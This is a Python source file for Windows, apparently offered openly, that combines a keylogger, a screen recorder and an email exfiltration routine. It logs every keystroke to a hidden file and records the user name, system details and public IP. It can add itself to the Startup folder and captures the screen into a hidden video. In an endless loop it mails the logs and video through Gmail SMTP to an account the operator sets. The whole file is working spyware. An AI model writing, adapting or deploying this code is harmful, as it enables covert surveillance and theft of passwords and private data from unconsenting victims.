import datetime
import os
import smtplib
import threading
import numpy as np
import cv2
import subprocess
import platform
import getpass
import pyautogui
import sys
import win32com.client
from win32api import GetSystemMetrics
from email.message import EmailMessage
from requests import get
from pynput.keyboard import Listener
from pathlib import Path


class FileVisibility:
    @staticmethod
    def hide_file(file_name):
        try:
            subprocess.check_call(["attrib", "+H", file_name])
        except:
            pass

    @staticmethod
    def unhide_file(file_name):
        try:
            subprocess.check_call(["attrib", "-H", file_name])
        except:
            pass


class Keylogger:
    current_user = getpass.getuser()
    logs_file = f"C:\\Users\\{current_user}\\Documents\\logs.txt"

    def __init__(self, add_to_startup=False):
        self.ctrl_c = r"\x03"
        self.ctrl_v = r"\x16"
        self.ctrl_x = r"\x18"
        self.ctrl_z = r"\x1a"
        self.ctrl_a = r"\x01"
        self.ctrl_s = r"\x13"
        self.ctrl_r = r"\x12"
        self.ctrl_y = r"\x19"
        self.ctrl_f = r"\x06"

        if add_to_startup:
            self.add_keylogger_to_startup()

        self.add_header_to_logs_file()

    def add_keylogger_to_startup(self):
        try:
            startup = f'C:\\Users\\{self.current_user}\\AppData\\Roaming\\Microsoft\\Windows\\Start ' \
                      f'Menu\\Programs\\Startup'
            target = sys.argv[0]
            file_name = Path(sys.argv[0]).stem
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(startup + '\\{}.lnk'.format(file_name))
            shortcut.Targetpath = target
            shortcut.WindowStyle = 7  # 7 - Minimized, 3 - Maximized, 1 - Normal
            shortcut.save()
        except Exception as e:
            with open(self.logs_file, "a+") as f:
                f.write(f"[ERR] Could not add keylogger script to startup. Error description: {str(e)}")

    def add_header_to_logs_file(self):
        with open(self.logs_file, "a+") as f:
            FileVisibility.hide_file(self.logs_file)

            current_date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            system_name = platform.system()
            system_version = platform.version()
            computer_name = platform.node()
            public_ip = get("https://api.ipify.org").text
            header_content = f"\n\n---------------------------" \
                             f"\nDATE: {current_date}" \
                             f"\nUSER: {self.current_user}" \
                             f"\nSYSTEM: {system_name} {system_version}" \
                             f"\nCOMPUTER_NAME: {computer_name}" \
                             f"\nPUBLIC_IP: {public_ip}" \
                             f"\n---------------------------\n\n"

            f.write(header_content)

    def on_key_press(self, key):
        pressed_key = str(key).replace("'", "")
        with open(self.logs_file, "a+") as f:
            if pressed_key == "Key.space":
                f.write(" ")
            elif pressed_key == "Key.enter":
                f.write("[ENTER]")
            elif pressed_key == self.ctrl_c:
                f.write("[CTRL+C]")
            elif pressed_key == self.ctrl_v:
                f.write("[CTRL+V]")
            elif pressed_key == self.ctrl_f:
                f.write("[CTRL+F]")
            elif pressed_key == self.ctrl_x:
                f.write("[CTRL+X]")
            elif pressed_key == self.ctrl_z:
                f.write("[CTRL+Z]")
            elif pressed_key == self.ctrl_a:
                f.write("[CTRL+A]")
            elif pressed_key == self.ctrl_s:
                f.write("[CTRL+S]")
            elif pressed_key == self.ctrl_y:
                f.write("[CTRL+Y]")
            elif pressed_key == self.ctrl_r:
                f.write("[CTRL+R]")
            elif pressed_key == "Key.alt_l" or pressed_key == "Key.alt_r":
                f.write("[ALT]")
            elif pressed_key == "Key.backspace":
                with open(self.logs_file, 'rb+') as file:
                    file.seek(-1, os.SEEK_END)
                    file.truncate()
            elif pressed_key.find("Key") == -1:
                f.write(pressed_key)

    def listen_for_key_press(self):
        with Listener(on_press=self.on_key_press) as listener:
            listener.join()


class ScreenRecorder:
    current_user = Keylogger.current_user
    video_file = f"C:\\Users\\{current_user}\\Videos\\screen.avi"

    def __init__(self, video_length=10):
        self.video_width = GetSystemMetrics(0)
        self.video_height = GetSystemMetrics(1)
        self.video_codec = cv2.VideoWriter_fourcc(*'XVID')
        self.video_fps = 20
        self.video_length = video_length

    def record_screen(self):
        FileVisibility.unhide_file(self.video_file)
        video_handler = cv2.VideoWriter(self.video_file,
                                        self.video_codec,
                                        self.video_fps,
                                        (self.video_width, self.video_height))
        FileVisibility.hide_file(self.video_file)

        for i in range(self.video_length * self.video_fps):
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            video_handler.write(frame)

        video_handler.release()
        cv2.destroyAllWindows()


class MailSender(ScreenRecorder):
    def __init__(self, email, password, video_length=10):
        super().__init__(video_length=video_length)
        self.email = email
        self.password = password
        self.video_file = ScreenRecorder.video_file
        self.logs_file = Keylogger.logs_file

        self.video_data = None
        self.file_data = None

    def get_logs_data(self):
        with open(self.logs_file, 'rb') as f:
            self.file_data = f.read()

    def get_video_data(self):
        with open(self.video_file, 'rb') as v:
            self.video_data = v.read()

    def send_email(self):
        while True:
            self.record_screen()

            message = EmailMessage()
            message['Subject'] = 'Logs'
            message['From'] = self.email
            message['To'] = self.email

            self.get_logs_data()
            self.get_video_data()

            message.add_attachment(self.video_data, maintype='application', subtype='octet-stream',
                                   filename=self.video_file)
            message.add_attachment(self.file_data, maintype='application', subtype='octet-stream',
                                   filename=self.logs_file)

            try:
                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                    smtp.login(self.email, self.password)
                    smtp.send_message(message)
                    print('\n[+] MESSAGE SENT')
            except smtplib.SMTPAuthenticationError:
                print('[ERR] Wrong login or password or less secure apps mode is disabled. Please check: '
                      'https://myaccount.google.com/lesssecureapps')
                with open(self.logs_file) as f:
                    f.write('[ERR] Wrong login or password or less secure apps mode is disabled. Please check: '
                            'https://myaccount.google.com/lesssecureapps')
            except Exception as e:
                print(f'[ERR] Another exception occured: {str(e)}')
                with open(self.logs_file) as f:
                    f.write(f'[ERR] Another exception occured: {str(e)}')


if __name__ == '__main__':
    keylogger = Keylogger()

    login = ''
    password = ''
    mail_sender = MailSender(login, password, 5)

    listener_thread = threading.Thread(target=keylogger.listen_for_key_press)
    mail_thread = threading.Thread(target=mail_sender.send_email)

    listener_thread.start()
    mail_thread.start()
